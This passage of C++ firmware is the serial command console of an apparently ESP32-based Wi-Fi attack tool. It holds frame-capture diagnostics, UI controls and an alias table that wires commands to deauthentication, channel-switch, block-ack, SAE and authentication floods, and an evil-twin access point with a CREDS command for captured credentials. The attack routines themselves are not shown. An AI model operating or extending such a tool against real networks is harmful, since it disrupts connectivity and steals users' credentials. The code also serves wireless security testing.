      Serial.printf(" cat=%u act=%u nch=%u cnt=%u", (unsigned)cat, (unsigned)act, (unsigned)nch,
                    (unsigned)cnt);
    } else if (cat == 37) {
      Serial.printf(" csa_ie=1 nch=%u cnt=%u", (unsigned)nch, (unsigned)cnt);
    }
    Serial.println();
  }
  const int csa_n = attack_csa_log_count();
  for (int i = 0; i < csa_n; i++) {
    uint8_t src[6] = {0};
    uint8_t nch = 0;
    uint8_t cnt = 0;
    uint8_t cat = 0;
    uint8_t act = 0;
    uint16_t len = 0;
    if (!attack_csa_log_at(i, src, &nch, &cnt, &cat, &act, &len)) continue;
    char s_mac[18];
    mac_to_str(src, s_mac);
    Serial.print("RXCSA ");
    Serial.print(i);
    Serial.print(" src=");
    Serial.print(s_mac);
    Serial.print(" cat=");
    Serial.print((unsigned)cat);
    Serial.print(" act=");
    Serial.print((unsigned)act);
    Serial.print(" nch=");
    Serial.print((unsigned)nch);
    Serial.print(" cnt=");
    Serial.print((unsigned)cnt);
    Serial.print(" len=");
    Serial.println((unsigned)len);
  }
  Serial.println("RXLOG_END");
}

bool parse_hex_filter_number(const char* text, int min_value, int max_value, int* out) {
  if (text == nullptr || *text == 0 || out == nullptr) return false;
  char* end = nullptr;
  const long value = strtol(text, &end, 10);
  if (end == text || *end != 0 || value < min_value || value > max_value) return false;
  *out = (int)value;
  return true;
}

void do_hexd() {
  int frame_type = -1, subtype = -1, tid = -1, htc = -1;
  bool tid_het = false, have_ta = false, have_ra = false;
  uint8_t ta[6], ra[6];
  char* token = nullptr;
  while ((token = strtok(nullptr, " \t")) != nullptr) {
    char* equal = strchr(token, '=');
    if (equal == nullptr || equal == token || equal[1] == 0) {
      Serial.println("ERR usage: HEXD [type=n sub=n tid=n|het htc=0|1 ta=mac ra=mac]");
      return;
    }
    *equal++ = 0;
    if (strcmp(token, "type") == 0) {
      if (!parse_hex_filter_number(equal, 0, 2, &frame_type)) {
        Serial.println("ERR HEXD type must be 0..2");
        return;
      }
    } else if (strcmp(token, "sub") == 0) {
      if (!parse_hex_filter_number(equal, 0, 15, &subtype)) {
        Serial.println("ERR HEXD sub must be 0..15");
        return;
      }
    } else if (strcmp(token, "tid") == 0) {
      if (token_iequals(equal, "het")) {
        tid_het = true;
      } else if (!parse_hex_filter_number(equal, 0, 15, &tid)) {
        Serial.println("ERR HEXD tid must be 0..15 or het");
        return;
      }
    } else if (strcmp(token, "htc") == 0) {
      if (!parse_hex_filter_number(equal, 0, 1, &htc)) {
        Serial.println("ERR HEXD htc must be 0 or 1");
        return;
      }
    } else if (strcmp(token, "ta") == 0 || strcmp(token, "ra") == 0) {
      const bool any = strcmp(equal, "any") == 0;
      uint8_t* out = strcmp(token, "ta") == 0 ? ta : ra;
      if (!any && !wb_parse_mac(equal, out)) {
        Serial.printf("ERR HEXD %s must be a MAC or any\n", token);
        return;
      }
      if (token[0] == 't') have_ta = !any;
      else have_ra = !any;
    } else {
      Serial.printf("ERR HEXD unknown filter '%s'\n", token);
      return;
    }
  }
  hex_capture_configure(frame_type, subtype, tid, tid_het, htc, have_ta ? ta : nullptr,
                        have_ra ? ra : nullptr);
  attack_sniffer_enable();
  char tid_text[12];
  if (tid_het) strcpy(tid_text, "het");
  else if (tid < 0) strcpy(tid_text, "any");
  else snprintf(tid_text, sizeof(tid_text), "%d", tid);
  Serial.printf("OK HEXD type=%d sub=%d tid=%s slots=%d max=%u\n", frame_type, subtype,
                tid_text, kHexSlots, (unsigned)kHexMax);
}

void do_hexlog() {
  hex_sample_t sample = {};
  int index = 0;
  while (index < kHexSlots && hex_capture_pop(&sample)) {
    char line[2 * kHexMax + 1];
    for (uint16_t i = 0; i < sample.stored_len; i++) {
      snprintf(line + 2 * i, sizeof(line) - 2 * i, "%02X", sample.data[i]);
    }
    line[2 * sample.stored_len] = 0;
    char rate_text[12];
    const char* rate = rx_rate_text(sample.radio.fmt, sample.radio.rate, sample.radio.mcs,
                                    sample.radio.sgi, rate_text, sizeof(rate_text));
    if (sample.stored_len == sample.len) {
      Serial.printf("HEX %d len=%u fmt=%u rate=%s ts=%lu %s\n", index++,
                    (unsigned)sample.len, (unsigned)sample.radio.fmt, rate,
                    (unsigned long)sample.ts, line);
    } else {
      Serial.printf("HEX %d len=%u cap=%u fmt=%u rate=%s ts=%lu %s\n", index++,
                    (unsigned)sample.len, (unsigned)sample.stored_len,
                    (unsigned)sample.radio.fmt, rate, (unsigned long)sample.ts, line);
    }
  }
  Serial.printf("HEXLOG_END hits=%lu hexdrop=%lu\n", (unsigned long)hex_capture_hits(),
                (unsigned long)hex_capture_drops());
}

void do_tidmix() {
  hex_mix_t mix = {};
  hex_capture_mix(&mix);
  Serial.printf("TIDMIX data=%lu htc=%lu hexdrop=%lu hexcov=0 tid=", (unsigned long)mix.data,
                (unsigned long)mix.htc, (unsigned long)hex_capture_drops());
  for (int i = 0; i < 16; i++) Serial.printf("%s%lu", i ? "," : "", (unsigned long)mix.tid[i]);
  Serial.print(" control_id=");
  for (int i = 0; i < 16; i++) Serial.printf("%s%lu", i ? "," : "", (unsigned long)mix.control_id[i]);
  Serial.printf(" len_lt64_lt256_lt512_ge512=%lu,%lu,%lu,%lu\n", (unsigned long)mix.lengths[0],
                (unsigned long)mix.lengths[1], (unsigned long)mix.lengths[2], (unsigned long)mix.lengths[3]);
}

void do_rxradio() {
  rx_radio_t radio = {};
  if (!attack_rx_radio_last(&radio)) {
    Serial.println("ERR RXRADIO no received frame");
    return;
  }
  if (radio.raw_fields_valid) {
    Serial.printf("RXRADIO sig_mode=%u cwb=%u mcs=%u rate=%u fmt=%u rssi=%d ch=%u dur=%u\n",
                  (unsigned)radio.sig_mode, (unsigned)radio.cwb, (unsigned)radio.mcs,
                  (unsigned)radio.rate, (unsigned)radio.fmt, (int)radio.rssi,
                  (unsigned)radio.channel, (unsigned)radio.duration);
  } else {
    Serial.printf("RXRADIO sig_mode=na cwb=na mcs=na rate=%u fmt=%u rssi=%d ch=%u dur=%u\n",
                  (unsigned)radio.rate, (unsigned)radio.fmt, (int)radio.rssi,
                  (unsigned)radio.channel, (unsigned)radio.duration);
  }
}

void do_touch() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  int raw_x = 0;
  int raw_y = 0;
  int screen_x = 0;
  int screen_y = 0;
  bool pressed = false;
  wireless_ui_touch_readback(&raw_x, &raw_y, &screen_x, &screen_y, &pressed);
  Serial.print("TOUCH raw_x=");
  Serial.print(raw_x);
  Serial.print(" raw_y=");
  Serial.print(raw_y);
  Serial.print(" x=");
  Serial.print(screen_x);
  Serial.print(" y=");
  Serial.print(screen_y);
  Serial.print(" pressed=");
  Serial.print(pressed ? 1 : 0);
  Serial.print(" irq=");
  Serial.println(wireless_ui_touch_irq_level());
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_calibrate() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  Serial.println("OK CALIBRATE, restarting");
  delay(100);
  wireless_ui_request_calibration();
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// Opens the on-screen target picker without touching the panel, so the popup
// can be exercised from the host (same path a finger takes).
void do_ui_targets() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_show_targets();
  Serial.println("OK UITARGETS");
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// Received-frame mix. Run it on a second board (or right after an attack on this
// one) to check what the radio actually hears: beacon / probe response / deauth
// counts plus control and data totals.
void do_rx_mix() {
  uint32_t mgmt[16] = {0};
  uint32_t ctrl = 0;
  uint32_t data = 0;
  attack_rx_mix(mgmt, &ctrl, &data);
  uint32_t other = 0;
  for (int i = 0; i < 16; i++) {
    if (i != 0 && i != 1 && i != 2 && i != 4 && i != 5 && i != 8 && i != 11 && i != 12) {
      other += mgmt[i];
    }
  }
  Serial.print("RXMIX beacon=");
  Serial.print((unsigned)mgmt[8]);
  Serial.print(" proberesp=");
  Serial.print((unsigned)mgmt[5]);
  Serial.print(" probereq=");
  Serial.print((unsigned)mgmt[4]);
  Serial.print(" deauth=");
  Serial.print((unsigned)mgmt[12]);
  Serial.print(" auth=");
  Serial.print((unsigned)mgmt[11]);
  Serial.print(" assoc=");
  Serial.print((unsigned)(mgmt[0] + mgmt[1] + mgmt[2]));
  Serial.print(" other_mgmt=");
  Serial.print((unsigned)other);
  Serial.print(" ctrl=");
  Serial.print((unsigned)ctrl);
  uint32_t csub[16] = {0};
  attack_rx_ctrl_mix(csub);
  Serial.print(" bar=");
  Serial.print((unsigned)csub[8]);
  Serial.print(" ba=");
  Serial.print((unsigned)csub[9]);
  Serial.print(" pspoll=");
  Serial.print((unsigned)csub[10]);
  Serial.print(" rts=");
  Serial.print((unsigned)csub[11]);
  Serial.print(" cts=");
  Serial.print((unsigned)csub[12]);
  Serial.print(" ack=");
  Serial.print((unsigned)csub[13]);
  Serial.print(" cfend=");
  Serial.print((unsigned)(csub[14] + csub[15]));
  // Trigger (subtype 2) is the only control frame an AP sends when it schedules
  // uplink OFDMA, so this counter is how a second chip proves the AP never does.
  Serial.print(" trig=");
  Serial.print((unsigned)csub[2]);
  Serial.print(" data=");
  Serial.print((unsigned)data);
  Serial.print(" action=");
  Serial.print((unsigned)attack_rx_action());
  Serial.print(" csa_action=");
  Serial.print((unsigned)attack_rx_csa_action());
  Serial.print(" csa_ie=");
  Serial.print((unsigned)attack_rx_csa_ie());
  Serial.print(" addba=");
  Serial.print((unsigned)attack_rx_addba());
  Serial.print(" delba=");
  Serial.println((unsigned)attack_rx_delba());
}

// REASON            -> report the current setting
// REASON 7          -> fixed code
// REASON random     -> random code per burst
void do_reason(char* token) {
  if (token == nullptr) {
    if (attack_reason_is_random()) {
      Serial.printf("REASON random (last=%u)\n", (unsigned)attack_reason_last());
    } else {
      Serial.printf("REASON %u\n", (unsigned)attack_reason_last());
    }
    return;
  }
  const reason_arg_t arg = parse_reason_arg(token);
  if (!apply_reason_arg(arg)) return;
  if (arg.kind == REASON_RANDOM) {
    Serial.println("OK REASON random");
  } else {
    Serial.printf("OK REASON %u\n", (unsigned)arg.value);
  }
}

void do_ui_reasons() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  wireless_ui_show_reasons();
  Serial.println("OK UIREASON");
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_ui_state() {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  Serial.print("UI screen=");
  Serial.print(wireless_ui_screen_name());
  Serial.print(" popup=");
  Serial.print(wireless_ui_popup_visible() ? 1 : 0);
  Serial.print(" items=");
  Serial.print(wireless_ui_popup_items());
  Serial.print(" rpopup=");
  Serial.print(wireless_ui_reason_popup_visible() ? 1 : 0);
  Serial.print(" ritems=");
  Serial.print(wireless_ui_reason_items());
  Serial.print(" nets=");
  Serial.println(g_scan_count);
#else
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

void do_ui_screen(char* token) {
#if CONFIG_WIRELESS_ATTACK_LVGL_SUPPORT
  if (token == nullptr) {
    Serial.println("ERR usage: UISCREEN <menu|deauth|mode|probe|csa|delba|ba|evil|btm|eapol|sae|authflood|qosnull>");
    return;
  }
  if (!wireless_ui_show_by_name(token)) {
    Serial.println("ERR unknown screen, try: menu deauth mode probe csa delba ba evil btm eapol sae authflood qosnull");
    return;
  }
  Serial.print("OK UISCREEN ");
  Serial.println(wireless_ui_screen_name());
#else
  (void)token;
  Serial.println("ERR LVGL UI is not enabled in this build");
#endif
}

// ------------------------------------------------------------------ dispatch

// ---- wbus aliases ----------------------------------------------------------

// A migrated command keeps its old name and its old reply text; the table only
// says which object answers it. Anything not listed here falls through to the
// legacy chain below, which is what lets the migration move one command at a time.
struct bus_alias_t {
  const char* command;
  const char* object;
  const char* method;
};

const bus_alias_t kBusAliases[] = {
    {"DEAUTH", "deauth", "start"},
    {"CSA", "csa", "start"},
    {"CSASTOP", "csa", "stop"},
    {"CSATEST", "csa", "test"},
    {"DELBA", "delba", "start"},
    {"DELBASTOP", "delba", "stop"},
    {"DELBATEST", "delba", "test"},
    {"BAATTACK", "ba", "attack"},
    {"BAPLANT", "ba", "plant"},
    {"BARPUSH", "ba", "push"},
    {"BATX", "ba", "tx"},
    {"BASTOP", "ba", "stop"},
    {"BATEST", "ba", "test"},
    {"DEAUTH_ALL", "deauth", "all"},
    {"DEAUTH_ONLY", "deauth", "only"},
    {"DEAUTH_EXCEPT", "deauth", "except"},
    {"PROBE_BROADCAST", "probe", "broadcast"},
    {"BAITAP", "baitap", "start"},
    {"BAITAPSTOP", "baitap", "stop"},
    {"BAITAPSTAT", "baitap", "status"},
    {"BTM", "btm", "start"},
    {"BTMSTOP", "btm", "stop"},
    {"BTMTEST", "btm", "test"},
    {"RRM", "rrm", "start"},
    {"RRMSTOP", "rrm", "stop"},
    {"RRMTEST", "rrm", "test"},
    {"BSRP", "bsrp", "start"},
    {"BSRPSTOP", "bsrp", "stop"},
    {"BSRPTEST", "bsrp", "test"},
    {"EAPOL", "eapol", "start"},
    {"EAPOLSTOP", "eapol", "stop"},
    {"EAPOLTEST", "eapol", "test"},
    {"QOSNULL", "qosnull", "start"},
    {"QOSNULLREL", "qosnull", "release"},
    {"QOSNULLSTOP", "qosnull", "stop"},
    {"QOSNULLTEST", "qosnull", "test"},
    {"SAE", "sae", "start"},
    {"SAESTOP", "sae", "stop"},
    {"SAETEST", "sae", "test"},
    {"AUTHFLOOD", "authflood", "start"},
    {"AUTHFLOODSTOP", "authflood", "stop"},
    {"AUTHFLOODTEST", "authflood", "test"},
    {"EVILTWIN", "evil", "start"},
    {"EVILTWIN_STOP", "evil", "stop"},
    {"CREDS", "evil", "creds"},
    {"RADIO", "radio", "status"},
};

const bus_alias_t* find_bus_alias(const char* command) {
  for (size_t i = 0; i < sizeof(kBusAliases) / sizeof(kBusAliases[0]); i++) {
    if (strcmp(command, kBusAliases[i].command) == 0) return &kBusAliases[i];
  }
  return nullptr;
}

// The reply sink is a file-scope function (it is injected into the bus, which lives
// in another translation unit); see the declaration above the namespace.

// Materialises the remaining tokens in one strtok pass and hands them over. This
// is also what kills the "never call strtok twice in one statement" trap for the
// migrated commands: every argument exists before any handler runs.
wb_err_t call_bus_alias(const bus_alias_t* alias) {
  char* argv[WB_MAX_ARGS];
  int argc = 0;
  while (argc < WB_MAX_ARGS) {
    char* token = strtok(nullptr, " \t");
    if (token == nullptr) break;
    argv[argc++] = token;
  }
  wb_reply_t reply;
  reply.sink = wbus_serial_sink;
  return wbus_call(alias->object, alias->method, argc, argv, &reply);
}

void dispatch(char* line) {
  if (line == nullptr) return;
  // Work on a copy: the legacy chain below keeps calling strtok(nullptr, ...), and
  // those calls must still see this line's tokens even though dispatch() itself
  // now also tokenizes. 112 bytes is the line buffer, so 128 is always enough.
  char work[128];
  const size_t raw_len = strlen(line);
  const size_t copy_len = (raw_len < sizeof(work)) ? raw_len : sizeof(work) - 1;
  memcpy(work, line, copy_len);
  work[copy_len] = 0;

  char* command = strtok(work, " \t");
  if (command == nullptr) return;
  for (char* p = command; *p != 0; p++) *p = (char)toupper((unsigned char)*p);

  if (const bus_alias_t* alias = find_bus_alias(command)) {
    call_bus_alias(alias);
    return;
  }

  if (strcmp(command, "WBUS") == 0) {
    wb_reply_t reply;
    reply.sink = wbus_serial_sink;
    wbus_list(&reply);
  } else if (strcmp(command, "DESCRIBE") == 0) {
    wb_reply_t reply;
    reply.sink = wbus_serial_sink;
    // No argument describes every object: one round trip is enough for a menu
    // builder, and the arguments stay lowercase so names match the tables.
    wbus_describe(strtok(nullptr, " \t"), &reply);
  } else if (strcmp(command, "CALL") == 0) {
    // CALL deauth.start idx=3 reason=7
    char* target = strtok(nullptr, " \t");
    char* dot = (target != nullptr) ? strchr(target, '.') : nullptr;
    if (dot == nullptr) {
      Serial.println("ERR usage: CALL <object>.<method> [arg=value ...]");
    } else {
      *dot = 0;
      char* argv[WB_MAX_ARGS];
      int argc = 0;
      while (argc < WB_MAX_ARGS) {
        char* token = strtok(nullptr, " \t");
        if (token == nullptr) break;
        argv[argc++] = token;
      }
      wb_reply_t reply;
      reply.sink = wbus_serial_sink;
      wbus_call_named(target, dot + 1, argc, argv, &reply);
    }
  } else if (strcmp(command, "EVTSUB") == 0) {
    char* pattern = strtok(nullptr, " \t");
    if (pattern == nullptr) {
      wbus_subscribe_clear();
      Serial.println("OK EVTSUB none");
    } else if (wbus_subscribe(pattern)) {
      Serial.printf("OK EVTSUB %s\n", pattern);
    } else {
      Serial.println("ERR too many subscribers");
    }
  } else if (strcmp(command, "HELP") == 0) {
    print_help();
  } else if (strcmp(command, "PING") == 0) {
    Serial.println("OK PONG");
  } else if (strcmp(command, "SCAN") == 0) {
    start_scan();
  } else if (strcmp(command, "STATUS") == 0) {
    do_status();
  } else if (strcmp(command, "STATS") == 0) {
    do_stats();
  } else if (strcmp(command, "STOP") == 0) {
    do_stop();
  } else if (strcmp(command, "REASON") == 0) {
    do_reason(strtok(nullptr, " \t"));
  } else if (strcmp(command, "RESTART") == 0) {
    Serial.println("OK RESTART");
    Serial.flush();
    delay(100);
    esp_restart();
  } else if (strcmp(command, "BSRPFIELD") == 0) {
    // Diagnostic knob for the schedule fields: without it the sweep that tells
    // "field read and rejected" apart from "frame rejected earlier" is
    // impossible, because the module ships every field as 0.
    char* name_token = strtok(nullptr, " \t");
    char* value_token = strtok(nullptr, " \t");
    if (name_token == nullptr) {
      Serial.printf("BSRPFIELD ul=%u gi=%u atp=%u ru=%u rssi=%u mcs=%u type=%u\n",
                    (unsigned)bsrp_ul_length(), (unsigned)bsrp_gi_ltf(),
                    (unsigned)bsrp_ap_tx_power(), (unsigned)bsrp_ru_allocation(),
                    (unsigned)bsrp_target_rssi(), (unsigned)bsrp_mcs(),
                    (unsigned)bsrp_trigger_type());
      return;
    }
    if (value_token == nullptr) {
      Serial.println("ERR usage: BSRPFIELD <ul|gi|atp|ru|rssi|mcs> <value>");
      return;
    }
    const long value = strtol(value_token, nullptr, 0);
    if (!bsrp_set_field(name_token, value)) {
      Serial.printf("ERR BSRPFIELD %s=%ld out of range or unknown field\n", name_token, value);
      return;
    }
    Serial.printf("OK BSRPFIELD %s=%ld\n", name_token, value);
  } else if (strcmp(command, "CTRLFILTER") == 0) {
    do_ctrl_filter(strtok(nullptr, " 	"));
  } else if (strcmp(command, "CTRLTEST") == 0) {
    char* sub_token = strtok(nullptr, " \t");
    char* ra_token = strtok(nullptr, " \t");
    char* dur_token = strtok(nullptr, " \t");
    do_ctrl_test(sub_token, ra_token, dur_token);
  } else if (strcmp(command, "MON") == 0) {
    char* ch_token = strtok(nullptr, " 	");
    char* sec_token = strtok(nullptr, " 	");
    do_monitor(ch_token, sec_token);
  } else if (strcmp(command, "STATIONS") == 0) {
    do_stations(strtok(nullptr, " \t"));
  } else if (strcmp(command, "RXLOG") == 0) {
    do_rxlog();
  } else if (strcmp(command, "RXMIX") == 0) {
    do_rx_mix();
  } else if (strcmp(command, "HEXD") == 0) {
    do_hexd();
  } else if (strcmp(command, "TIDMIX") == 0) {
    do_tidmix();
  } else if (strcmp(command, "HEXLOG") == 0) {
    do_hexlog();
  } else if (strcmp(command, "HEXSTOP") == 0) {
    hex_capture_stop();
    Serial.println("OK HEXSTOP");
  } else if (strcmp(command, "RXRADIO") == 0) {
    do_rxradio();
  } else if (strcmp(command, "TOUCH") == 0) {
    do_touch();
  } else if (strcmp(command, "UITARGETS") == 0) {
    do_ui_targets();
  } else if (strcmp(command, "UIREASON") == 0) {
    do_ui_reasons();
  } else if (strcmp(command, "UISCREEN") == 0) {
    do_ui_screen(strtok(nullptr, " 	"));
  } else if (strcmp(command, "UI") == 0) {
    do_ui_state();
  } else if (strcmp(command, "CALIBRATE") == 0) {
    do_calibrate();
  } else {
    Serial.printf("ERR unknown command '%s' (try HELP)\n", command);
    ui_log("unknown command");
  }
}

}  // namespace

// ---- wbus bridge -----------------------------------------------------------
// External linkage on purpose: bus_objects.cpp (another translation unit) calls
// console_scan_count/console_apply_reason and stores wbus_serial_sink.

void wbus_serial_sink(const char* bytes) {
  // Whole lines, written untouched: println-style lines already carry "\r\n" and
  // printf("...\n") lines carry a bare "\n", and both must stay that way.
  if (bytes != nullptr) Serial.print(bytes);
}

int console_scan_count(void) { return g_scan_count; }

int console_parse_index_list(char* text, int* out, int max) {
  return parse_index_list(text, out, max);
}

// The bus validates the token, this applies it. Order matters: the legacy DEAUTH
// branch applied the reason first, so a bad reason is reported even when the index
// is bad as well, and an out-of-set reason emits its INFO line before the OK.
bool console_apply_reason(const wb_value_t* value, uint16_t* out_value) {
  reason_arg_t arg = {REASON_FIXED, 1};
  if (value != nullptr && value->present) {
    if (value->text != nullptr && strcmp(value->text, "random") == 0) {
      arg.kind = REASON_RANDOM;
    } else {
      arg.value = (uint16_t)value->num;
    }
  }
  if (!apply_reason_arg(arg)) return false;
  if (out_value != nullptr) *out_value = arg.value;
  return true;
}

void console_ui_log(const char* text) { ui_log(text); }

void init_serial_console() {
  // The default UART RX ring is 256 bytes; a burst of commands (the GUI, a script,
  // or a pentest harness) overruns it and lines get dropped. Grow it *before*
  // begin() so the driver allocates the bigger ring.
  Serial.setRxBufferSize(SERIAL_RX_BUFFER_SIZE);
  Serial.begin(115200);
  wbus_set_sink(wbus_serial_sink);
  wbus_register_all();
  xTaskCreate(scan_task, "scan", 4096, nullptr, 2, &s_scan_task);
  delay(50);
  Serial.println("INFO Wireless-Attack ready, type HELP");
}

void handle_serial_console() {
  if (stations_poll()) {
    print_stations();
  }
  while (Serial.available() > 0) {
    const char c = (char)Serial.read();
    if (c == '\r') continue;
    if (c == '\n') {
      g_line[g_len] = 0;
      if (g_len > 0) dispatch(g_line);
      g_len = 0;
    } else if (g_len < sizeof(g_line) - 1) {
      g_line[g_len++] = c;
    } else {
      g_len = 0;
      Serial.println("ERR line too long");
    }
  }
}

void wireless_console_execute(const char* line) {
  if (line == nullptr) return;
  char buffer[112];
  size_t len = strlen(line);
  if (len >= sizeof(buffer)) len = sizeof(buffer) - 1;
  memcpy(buffer, line, len);
  buffer[len] = 0;
  dispatch(buffer);
}
